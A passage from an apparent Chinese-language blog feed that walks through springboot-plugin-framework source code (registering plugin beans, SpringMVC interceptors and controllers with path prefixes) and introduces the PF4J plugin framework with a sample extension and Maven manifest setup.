class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registry</span><span class="params">(PluginRegistryInfo pluginRegistryInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    GenericApplicationContext pluginApplicationContext = pluginRegistryInfo.getPluginApplicationContext();</span><br><span class="line">    <span class="comment">// 进行bean注册</span></span><br><span class="line">    <span class="keyword">for</span> (PluginBeanRegistrar pluginBeanDefinitionRegistrar : pluginBeanDefinitionRegistrars) &#123;</span><br><span class="line">        pluginBeanDefinitionRegistrar.registry(pluginRegistryInfo);</span><br><span class="line">    &#125;</span><br><span class="line">    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(pluginRegistryInfo.getPluginClassLoader());</span><br><span class="line">        pluginApplicationContext.refresh();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(contextClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向插件静态容器中新增插件的ApplicationContext</span></span><br><span class="line">    String pluginId = pluginRegistryInfo.getPluginWrapper().getPluginId();</span><br><span class="line">    PluginInfoContainers.addPluginApplicationContext(pluginId, pluginApplicationContext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ConfigBeanRegistrar.java为例，其他也是调用SpringBeanRegister进行注册到插件IOC</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registry</span><span class="params">(PluginRegistryInfo pluginRegistryInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    List&lt;Class&lt;?&gt;&gt; configBeans =</span><br><span class="line">            pluginRegistryInfo.getGroupClasses(ConfigBeanGroup.GROUP_ID);</span><br><span class="line">    <span class="keyword">if</span>(configBeans == <span class="keyword">null</span> || configBeans.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String pluginId = pluginRegistryInfo.getPluginWrapper().getPluginId();</span><br><span class="line">    SpringBeanRegister springBeanRegister = pluginRegistryInfo.getSpringBeanRegister();</span><br><span class="line">    <span class="keyword">for</span> (Class&lt;?&gt; aClass : configBeans) &#123;</span><br><span class="line">        <span class="keyword">if</span>(aClass == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 注册Bean到IOC</span></span><br><span class="line">        springBeanRegister.register(pluginId, aClass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SpringBeanRegister.java 通用Bean注册</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">register</span><span class="params">(String pluginId, Class&lt;?&gt; aClass,</span></span></span><br><span class="line"><span class="function"><span class="params">                           Consumer&lt;AnnotatedGenericBeanDefinition&gt; consumer)</span> </span>&#123;</span><br><span class="line">    AnnotatedGenericBeanDefinition beanDefinition = <span class="keyword">new</span> AnnotatedGenericBeanDefinition(aClass);</span><br><span class="line">    beanDefinition.setBeanClass(aClass);</span><br><span class="line">    BeanNameGenerator beanNameGenerator =</span><br><span class="line">            <span class="keyword">new</span> PluginAnnotationBeanNameGenerator(pluginId);</span><br><span class="line">    String beanName = beanNameGenerator.generateBeanName(beanDefinition, applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(applicationContext.containsBean(beanName))&#123;</span><br><span class="line">        String error = MessageFormat.format(<span class="string">"Bean name &#123;0&#125; already exist of &#123;1&#125;"</span>,</span><br><span class="line">                beanName, aClass.getName());</span><br><span class="line">        logger.debug(error);</span><br><span class="line">        <span class="keyword">return</span> beanName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(consumer != <span class="keyword">null</span>)&#123;</span><br><span class="line">        consumer.accept(beanDefinition);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此处为插件级别上下文，因此Bean是注册到插件的IOC容器中。上下文为实例化 PluginRegistryInfo 时初始化</span></span><br><span class="line">    applicationContext.registerBeanDefinition(beanName, beanDefinition);</span><br><span class="line">    <span class="keyword">return</span> beanName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="PluginInterceptorsPipeProcessor-java处理SpringMVC拦截器"><a href="#PluginInterceptorsPipeProcessor-java处理SpringMVC拦截器" class="headerlink" title="PluginInterceptorsPipeProcessor.java处理SpringMVC拦截器"></a>PluginInterceptorsPipeProcessor.java处理SpringMVC拦截器</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registry</span><span class="params">(PluginRegistryInfo pluginRegistryInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(handlerMapping == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取插件上下文</span></span><br><span class="line">    GenericApplicationContext pluginApplicationContext = pluginRegistryInfo.getPluginApplicationContext();</span><br><span class="line">    <span class="comment">// 获取PluginInterceptorRegister(starblues)类型的Bean，需要将插件中SpringMVC的拦截器HandlerInterceptor通过此类进行注册</span></span><br><span class="line">    <span class="comment">// 因此常规的通过Spring的InterceptorRegistry进行注册是无法成功的</span></span><br><span class="line">    List&lt;PluginInterceptorRegister&gt; interceptorRegisters = SpringBeanUtils.getBeans(pluginApplicationContext,</span><br><span class="line">            PluginInterceptorRegister.class);</span><br><span class="line">    List&lt;HandlerInterceptor&gt; interceptorsObjects = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    List&lt;HandlerInterceptor&gt; adaptedInterceptors = getAdaptedInterceptors();</span><br><span class="line">    <span class="keyword">if</span>(adaptedInterceptors == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据拦截的controller的前缀进行处理，如：/plugins/plugin-id</span></span><br><span class="line">    String pluginRestPrefix = CommonUtils.getPluginRestPrefix(configuration, pluginRegistryInfo.getPluginWrapper().getPluginId());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (PluginInterceptorRegister interceptorRegister : interceptorRegisters) &#123;</span><br><span class="line">        PluginInterceptorRegistry interceptorRegistry = <span class="keyword">new</span> PluginInterceptorRegistry(pluginRestPrefix);</span><br><span class="line">        <span class="comment">// 注册实际的SpringMVC的拦截器HandlerInterceptor</span></span><br><span class="line">        interceptorRegister.registry(interceptorRegistry);</span><br><span class="line">        <span class="comment">// 获取插件拦截器</span></span><br><span class="line">        List&lt;Object&gt; interceptors = interceptorRegistry.getInterceptors();</span><br><span class="line">        <span class="keyword">if</span>(interceptors == <span class="keyword">null</span> || interceptors.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Object interceptor : interceptors) &#123;</span><br><span class="line">            <span class="comment">// 转换拦截器为 HandlerInterceptor 类</span></span><br><span class="line">            HandlerInterceptor handlerInterceptor = adaptInterceptor(interceptor);</span><br><span class="line">            adaptedInterceptors.add(handlerInterceptor);</span><br><span class="line">            interceptorsObjects.add(handlerInterceptor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pluginRegistryInfo.addExtension(INTERCEPTORS, interceptorsObjects);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插件注册后流水线处理"><a href="#插件注册后流水线处理" class="headerlink" title="插件注册后流水线处理"></a>插件注册后流水线处理</h3><h4 id="Controller处理"><a href="#Controller处理" class="headerlink" title="Controller处理"></a>Controller处理</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以 PluginControllerPostProcessor 为例</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PluginControllerPostProcessor</span><span class="params">(ApplicationContext mainApplicationContext)</span></span>&#123;</span><br><span class="line">    Objects.requireNonNull(mainApplicationContext);</span><br><span class="line">    <span class="comment">// 获取主系统的RequestMappingHandlerMapping对象</span></span><br><span class="line">    <span class="keyword">this</span>.requestMappingHandlerMapping = mainApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">    <span class="keyword">this</span>.configuration = mainApplicationContext.getBean(IntegrationConfiguration.class);</span><br><span class="line">    <span class="keyword">this</span>.pluginControllerProcessors = ExtensionFactory</span><br><span class="line">            .getPluginControllerProcessorExtend(mainApplicationContext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registry</span><span class="params">(List&lt;PluginRegistryInfo&gt; pluginRegistryInfos)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (PluginRegistryInfo pluginRegistryInfo : pluginRegistryInfos) &#123;</span><br><span class="line">        <span class="comment">// 获取 spring_controller 组下的所有类</span></span><br><span class="line">        List&lt;Class&lt;?&gt;&gt; groupClasses = pluginRegistryInfo.getGroupClasses(ControllerGroup.GROUP_ID);</span><br><span class="line">        <span class="keyword">if</span>(groupClasses == <span class="keyword">null</span> || groupClasses.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String pluginId = pluginRegistryInfo.getPluginWrapper().getPluginId();</span><br><span class="line">        List&lt;ControllerWrapper&gt; controllerBeanWrappers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; groupClass : groupClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span>(groupClass == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 构建一个ControllerWrapper</span></span><br><span class="line">                ControllerWrapper controllerBeanWrapper = registry(pluginRegistryInfo, groupClass);</span><br><span class="line">                controllerBeanWrappers.add(controllerBeanWrapper);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                pluginRegistryInfo.addProcessorInfo(getKey(pluginRegistryInfo), controllerBeanWrappers);</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用扩展出的接口控制器</span></span><br><span class="line">        resolveProcessExtend(extend-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                extend.registry(pluginId, controllerBeanWrappers);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                log.error(<span class="string">"'&#123;&#125;' process plugin[&#123;&#125;] error in registry"</span>,</span><br><span class="line">                        extend.getClass().getName(),</span><br><span class="line">                        pluginId,  e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        pluginRegistryInfo.addProcessorInfo(getKey(pluginRegistryInfo), controllerBeanWrappers);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建ControllerWrapper</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> ControllerWrapper <span class="title">registry</span><span class="params">(PluginRegistryInfo pluginRegistryInfo, Class&lt;?&gt; aClass)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String pluginId = pluginRegistryInfo.getPluginWrapper().getPluginId();</span><br><span class="line">    GenericApplicationContext pluginApplicationContext = pluginRegistryInfo.getPluginApplicationContext();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object object = pluginApplicationContext.getBean(aClass);</span><br><span class="line">        ControllerWrapper controllerBeanWrapper = <span class="keyword">new</span> ControllerWrapper();</span><br><span class="line">        <span class="comment">// 设置插件controller的前缀，如：/plugins/plugin-id</span></span><br><span class="line">        setPathPrefix(pluginId, aClass);</span><br><span class="line">        Method getMappingForMethod = ReflectionUtils.findMethod(RequestMappingHandlerMapping.class,</span><br><span class="line">                <span class="string">"getMappingForMethod"</span>, Method.class, Class.class);</span><br><span class="line">        getMappingForMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Method[] methods = aClass.getMethods();</span><br><span class="line">        Set&lt;RequestMappingInfo&gt; requestMappingInfos = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isHaveRequestMapping(method)) &#123;</span><br><span class="line">                RequestMappingInfo requestMappingInfo = (RequestMappingInfo)</span><br><span class="line">                        getMappingForMethod.invoke(requestMappingHandlerMapping, method, aClass);</span><br><span class="line">                <span class="comment">// 最终会调用到springmvc的AbstractHandlerMethodMapping#register方法</span></span><br><span class="line">                <span class="comment">// 将URL-HandlerMethod映射关系保存到**主系统**的mappingRegistry中(requestMappingHandlerMapping为主系统Bean)</span></span><br><span class="line">                <span class="comment">// 参考[spring-mvc-src.md#mappingRegistry初始化](/_posts/java/java-src/spring-mvc-src.md#mappingRegistry初始化)</span></span><br><span class="line">                requestMappingHandlerMapping.registerMapping(requestMappingInfo, object, method);</span><br><span class="line">                requestMappingInfos.add(requestMappingInfo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        controllerBeanWrapper.setRequestMappingInfos(requestMappingInfos);</span><br><span class="line">        controllerBeanWrapper.setBeanClass(aClass);</span><br><span class="line">        <span class="keyword">return</span> controllerBeanWrapper;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        <span class="comment">// 出现异常, 卸载该 controller bean</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setPathPrefix</span><span class="params">(String pluginId, Class&lt;?&gt; aClass)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取类注解 @RequestMapping 进行添加前缀</span></span><br><span class="line">    RequestMapping requestMapping = aClass.getAnnotation(RequestMapping.class);</span><br><span class="line">    <span class="keyword">if</span>(requestMapping == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String pathPrefix = CommonUtils.getPluginRestPrefix(configuration, pluginId);</span><br><span class="line">    <span class="keyword">if</span>(StringUtils.isNullOrEmpty(pathPrefix))&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    InvocationHandler invocationHandler = Proxy.getInvocationHandler(requestMapping);</span><br><span class="line">    Set&lt;String&gt; definePaths = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    definePaths.addAll(Arrays.asList(requestMapping.path()));</span><br><span class="line">    definePaths.addAll(Arrays.asList(requestMapping.value()));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Field field = invocationHandler.getClass().getDeclaredField(<span class="string">"memberValues"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map&lt;String, Object&gt; memberValues = (Map&lt;String, Object&gt;) field.get(invocationHandler);</span><br><span class="line">        String[] newPath = <span class="keyword">new</span> String[definePaths.size()];</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (String definePath : definePaths) &#123;</span><br><span class="line">            <span class="comment">// 解决插件启用、禁用后, 路径前缀重复的问题。</span></span><br><span class="line">            <span class="keyword">if</span>(definePath.contains(pathPrefix))&#123;</span><br><span class="line">                newPath[i++] = definePath;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                newPath[i++] = CommonUtils.restJoiningPath(pathPrefix, definePath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(newPath.length == <span class="number">0</span>)&#123;</span><br><span class="line">            newPath = <span class="keyword">new</span> String[]&#123; pathPrefix &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        memberValues.put(<span class="string">"path"</span>, newPath);</span><br><span class="line">        memberValues.put(<span class="string">"value"</span>, <span class="keyword">new</span> String[]&#123;&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        log.error(<span class="string">"Define Plugin RestController pathPrefix error : &#123;&#125;"</span>, e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pf4j"><a href="#pf4j" class="headerlink" title="pf4j"></a>pf4j</h2><ul><li><strong>2021-04转向sofastack</strong></li><li><a href="https://github.com/pf4j/pf4j" target="_blank" rel="noopener">PF4J</a> 是一个 Java 的插件框架，为第三方提供应用扩展的渠道<ul><li>基于java特性<a href="/_posts/java/java-release.md#SPI">SPI</a>进行开发</li><li>PF4J 本身非常轻量级，只有 50KB 左右，目前只依赖了 slf4j</li><li>Gitblit 项目使用的就是 PF4J 进行插件管理</li></ul></li><li>组件<ul><li><code>Plugin</code> 是所有插件类型的基类。为了避免冲突，每个插件都被加载到一个单独的类加载器中</li><li><code>PluginManager</code> 用于插件管理的所有方面（加载、启动、停止）</li><li><code>PluginLoader</code> 加载插件所需的所有信息（类）</li><li>可以将任何接口或抽象类标记为扩展点（即继承<code>ExtensionPoint</code>接口），并使用<code>@Extension</code>标记扩展点的实现类</li></ul></li><li>相关生态<ul><li>pf4j-update（PF4J的更新机制）</li><li>pf4j-spring（PF4J-Spring框架集成）</li><li>pf4j-wicket（PF4J-Wicket集成）</li><li>pf4j-web（web应用程序中的PF4J）</li><li>springboot-plugin-framework（见下文）</li></ul></li><li>案例</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参考：https://www.cnblogs.com/fengyun2050/p/12809204.html</span></span><br><span class="line"><span class="comment">// 主程序定义扩展点</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Greeting</span> <span class="keyword">extends</span> <span class="title">ExtensionPoint</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getGreeting</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插件定义实现类</span></span><br><span class="line"><span class="meta">@Extension</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WelcomeGreeting</span> <span class="keyword">implements</span> <span class="title">Greeting</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getGreeting</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插件maven打包（参考下文maven配置），会在MANIFEST.MF文件生成如下(可以将插件作为jar文件分发)</span></span><br><span class="line"><span class="comment">// 插件id为welcome-plugin（强制属性）、版本为0.0.1（强制属性）、类为cn.aezo.test.pf4j.welcome.WelcomePlugin（可选属性）作者为Smalle的插件；以及与插件x, y, z（可选属性）的依赖关系</span></span><br><span class="line">Plugin-Id: welcome-plugin</span><br><span class="line">Plugin-Version: <span class="number">0.0</span>.1</span><br><span class="line">Plugin-Class: cn.aezo.test.pf4j.welcome.WelcomePlugin</span><br><span class="line">Plugin-Provider: Smalle</span><br><span class="line">Plugin-Dependencies: x, y, z</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主程序中使用插件</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// jar插件管理器</span></span><br><span class="line">    PluginManager pluginManager = <span class="keyword">new</span> JarPluginManager();<span class="comment">// or "new ZipPluginManager() / new DefaultPluginManager()"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载指定路径插件</span></span><br><span class="line">    pluginManager.loadPlugin(Paths.get(<span class="string">"plugins-0.0.1-SNAPSHOT.jar"</span>)); <span class="comment">// 或 pluginManager.loadPlugins(); 加载所有</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动指定插件(也可以加载所有插件)</span></span><br><span class="line">    pluginManager.startPlugin(<span class="string">"welcome-plugin"</span>); <span class="comment">// 或 pluginManager.startPlugins(); 启动所有</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行插件</span></span><br><span class="line">    List&lt;Greeting&gt; greetings = pluginManager.getExtensions(Greeting.class);</span><br><span class="line">    <span class="keyword">for</span> (Greeting greeting : greetings) &#123;</span><br><span class="line">        System.out.println(<span class="string">"&gt;&gt;&gt; "</span> + greeting.getGreeting()); <span class="comment">// Welcome</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>插件maven打包</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Plugin-Id</span>&gt;</span>welcome-plugin<span class="tag">&lt;/<span class="name">Plugin-Id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Plugin-Version</span>&gt;</span>0.0.1<span class="tag">&lt;/<span class="name">Plugin-Version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2021-04转向sofastack&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gi
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="src" scheme="http://blog.aezo.cn/tags/src/"/>
    
      <category term="springboot" scheme="http://blog.aezo.cn/tags/springboot/"/>
    
      <category term="plugin" scheme="http://blog.aezo.cn/tags/plugin/"/>
    
  </entry>
  
  <entry>
    <title>微前端</title>
    <link href="http://blog.aezo.cn/2021/03/03/web/micro-web/"/>
    <id>http://blog.aezo.cn/2021/03/03/web/micro-web/</id>
    <published>2021-03-03T12:35:00.000Z</published>
    <updated>2022-03-06T14:10:30.427Z</updated>
    
